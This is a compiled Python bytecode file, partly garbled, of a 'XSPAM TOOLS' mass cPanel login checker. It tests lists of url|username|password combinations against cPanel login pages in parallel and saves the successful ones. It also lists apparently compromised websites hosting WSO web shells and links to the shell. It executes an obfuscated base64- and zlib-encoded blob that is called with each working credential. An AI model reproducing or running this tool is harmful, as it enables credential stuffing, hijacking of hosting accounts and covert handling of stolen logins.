ó
æ^c           @   s?  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z d  d l Te   d Z d Z d Z d Z d	 Z d
 Z d Z e e e GHd Z y e j d  Wn n Xd   Z d Z e j  e j! e   d Ud   Z" e d k r}e   n¾ e d k r;y¥ d Z# e e# e GHe$ e d e  Z% y. e& e% d   Z' e' j(   j)   Z( Wd QXWn e* k
 rôn Xe+ e(  Z( y" e d  Z, e, j- e" e(  Z. Wn n XWq;q;Xn  d S(   iÿÿÿÿN(   t   Pool(   t   system(   t   *s   V1.3-2s   [31ms   [32ms   [34ms   [33ms   [37msF  
====================================================================
----------------------------- XSPAM TOOLS --------------------
------------ More Tools: https://xspamtools.me ---------------
====================================================================

   _____                        _ 
  / ____|                      | |
 | |     _ __   __ _ _ __   ___| |
 | |    | '_ \ / _` | '_ \ / _ \ |
 | |____| |_) | (_| | | | |  __/ |
  \_____| .__/ \__,_|_| |_|\___|_|
        | |                       
        |_|                       

                                                                                      
MASS CPANEL CHECK
CPANEL MUST SUPPORT HOST FUNCTION
Note: Success working file will be stored in result                              

====================================================================
i
   t   resultsc          C   s   d }  t  |  t GHd  S(   Ns#  
Rules: must use wso shell this one --> https://pastebin.com/Ds35ij44


1. Mass shell to anything uploader! 
	Put shell list like this
		http://toprose24.ru/wp-includes/js/tinymce/wso.php
		http://nacso.org/wp-admin/shop/media/wso.php
		http://www.systemawindsor.com/2014/wso.php
		http://heights.co.kr/wp-includes/js/tinymce/wso.php
		http://mybaguse.com/oldsite/wp-includes/wso.php
		http://bdsharebazar.info/wp-includes/Core/wso.php
		http://www.modsolar.net/wp-content/uploads/wso.php
		http://theknittingneedle.in//wp-includes/css/wso.php



(   t   yellowt   white(   t   gd(    (    s   masscp10.pyt   guide?   s    st   eNpLSU1TyMlMTs0rTtUoLinKzEvXtOLlAgkp2CoUpRaWphaXFOulp5ZoKGWUlBQUW+nrV5Tk5+cU6+Wm6hcnlqUW6ackliTag5i2SgraClBDAE5FHno=c         C   sí   yß |  j  d  \ } } } t j   } | d } i | d 6| d 6} | j | d | d d } d | j k rÉ t d	 |   t d
 | d t GHt j	 d  t
 d d  j |  d  t j	 d  n t d | d t GHWn n Xd  S(   Nt   |s   /login/?login_only=1t   usert   passt   datat   timeouti   t   security_tokens   cp -> s   [+] s    ==> Login Successful!R   s   cp_loginok.txtt   as   
s   ..s   [-] s    ==> Login Invalid!(   t   splitt   requestst   Sessiont   postt   contentt   licenset   greenR   t   ost   chdirt   opent   writet   red(   t   urlt   domaint   usernamet   pwdt   libt   hostt   logt   req(    (    s   masscp10.pyt   tool10U   s    
i    sE   [?] Enter cPanel like this -> https://sitee.me:2083|username|passwords   [?] Enter cPanels list: t   r(/   R   t   sysR   t   ret   randomt   urllib2t   urllibt   httplibt   sockett   sslt   stringt   base64t   zlibt   multiprocessingR    t   multiprocessing.dummyt
   ThreadPoolt   platformR   t   coloramat   initt   currentVersionR   R   t   blueR   R   t   combot   choicet   mkdirR   t   singlelicenset
   decompresst	   b64decodeR#   t   examplet	   raw_inputt	   listshellR   t   gett   readt
   splitlinest   IOErrort   listt   ppt   mapt   pr(    (    (    s   masscp10.pyt   <module>   sl   
		
